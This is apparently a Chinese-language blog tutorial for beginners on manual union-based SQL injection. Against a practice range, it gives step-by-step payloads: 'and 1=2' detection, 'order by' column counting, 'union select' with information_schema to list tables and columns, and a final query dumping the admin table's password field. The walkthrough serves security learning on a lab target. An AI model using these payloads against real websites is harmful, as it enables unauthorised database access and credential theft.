**hello大家好，今天我们来详细谈谈SQL注入攻击和MySQL数据库的框架，方便萌新入坑**

## first·准备靶场

这里我们借一下隔壁掌控安全的封神台

> [https://hack.zkaq.cn/ ](https://hack.zkaq.cn/%E8%BF%99)

打开第一个靶场——为了女神小芳

![1672459365_63afb4658c53acef49115.png!small?1672459366638](https://image.3001.net/images/20221231/1672459365_63afb4658c53acef49115.png!small?1672459366638)

## second·了解数据库框架

### 首先来了解下什么是SQL注入漏洞

> sql注入：owaspTOP10之一  
> 凡是使用数据库开发的系统，就可能存在sql注入
>
> 可以攻破数据库，造成数据库泄露、操作文件、执行系统命令
>
> 总之一句话：强

### 数据库的框架是

>  **库 >表>字段>字段内容**
>
> ### 所以我们进行SQL注入攻击的时候要先爆库再爆表然后字段最后内容

### 漏洞的原理是

> sql注入：将用户输入的数据拼接上SQL语句当作代码进行执行（*）
>
>  
> 注入：注入攻击，将用户输入的数据当作自身的代码进行执行------产生漏洞
>
>  
>

SQL语句SELECT * FROM意为从...查表

## third·手动注入的三部曲

### 曲目一：

### 检测是否存在SQL注入漏洞

> 检测：and 1=2 （连接前后语句，前为真，后为真，结果才为真）

简单来讲就是你输入and 1=1页面和原本的一样没有错误

输入and 1=2页面就有问题了，比如缺图片什么的

### 下一步：查询字段数

> 语句为 order by +number

这里要注意的是你输入的大于网站的就会报错，反之不会

就比如这样，我输入order by 3他就出错了，所以字段数为2

![1672460609_63afb94178216065b06d3.png!small?1672460611565](https://image.3001.net/images/20221231/1672460609_63afb94178216065b06d3.png!small?1672460611565)

![1672460630_63afb956a911b962dca61.png!small?1672460631615](https://image.3001.net/images/20221231/1672460630_63afb956a911b962dca61.png!small?1672460631615)

然后看回显点 union select 1,2  

其中的1,2取决于你前面查询的字段数

![1672460872_63afba486284e12a3d97b.png!small?1672460873895](https://image.3001.net/images/20221231/1672460872_63afba486284e12a3d97b.png!small?1672460873895)

网页显示2，所以说回显点为2，后续的操作都要围绕这个2来进行

### OK我们已经将铺垫部分做好了，现在就要大显身手了

### 曲目二：

### 开始进行SQL注入攻击

我们前文提过，数据库的结构分为

>  **库 >表>字段>字段内容**

### A,先查库

> and 1=2 union select 1,database()

![1672461181_63afbb7d3ca0c018f41f4.png!small?1672461182241](https://image.3001.net/images/20221231/1672461181_63afbb7d3ca0c018f41f4.png!small?1672461182241)

可以看到啊，它显示了一个maoshe的东西

### B,查询这个库里面的表

> and 1=2 union select 1,table_name from information_schema.tables where
> table_schema=database() limit 0,1

![1672461247_63afbbbfd377475e4709d.png!small?1672461249392](https://image.3001.net/images/20221231/1672461247_63afbbbfd377475e4709d.png!small?1672461249392)

![1672461261_63afbbcddf048940cabd9.png!small?1672461262810](https://image.3001.net/images/20221231/1672461261_63afbbcddf048940cabd9.png!small?1672461262810)

可以看到他有几个表，有admin和dirs

这里我提一下，

table_name意思是要查询的字段，from后面的是指定要查询的表

> SELECT * FROM a where  
> select 查询  
> * 所有字段  
> from 指定表  
> a 表的名字  
> where 条件

limit 0,1中的0的意思是第一行

1的意思是要查询多少条数据出来

1  
---  
2  
3  
  
  

假设这个就是一个表啊，我输入limit 0,1

他就会出现

1  
---  
  
什么意思呢，就是我要查询第一行，你给我报1条数据

如果我们输入limit 0,2

他就会出现

1  
---  
2  
  
再比如

我输入limit 1,2

意思就是查询第二行，一共出现两条数据

那么就会显示

2  
---  
  
3  
  
 **好了，回归正题**

我们刚刚报出来有admin和dirs两个表

有经验的海阔就会知道我们要查询admin这个表

因为admin意思是管理员

###  **C.查询表里面的字段**

> and 1=2 union select 1,column_name from information_schema.columns where
> table_schema=database() and table_name='admin' limit 0,1

![1672462312_63afbfe8aa30a8aa56b1c.png!small?1672462313637](https://image.3001.net/images/20221231/1672462312_63afbfe8aa30a8aa56b1c.png!small?1672462313637)

可以看到共有id/username/password这3个字段

### D,查询字段里面的内容

> and 1=2 union select 1,password from admin limit 0,1

![1672462474_63afc08aa9b2022746410.png!small?1672462475665](https://image.3001.net/images/20221231/1672462474_63afc08aa9b2022746410.png!small?1672462475665)

OK，一次圆满的SQL注入攻击到此结束

结语：

这是我第一次写SQL注入的文章，我不敢说这是全网最详细的，但是我能保证这一定比大部分的讲SQL注入的文章要详细，如果你认为我写的可以，请为我点一个赞详细，这将是对我最大的鼓励，谢谢。最后祝大家2023快乐！

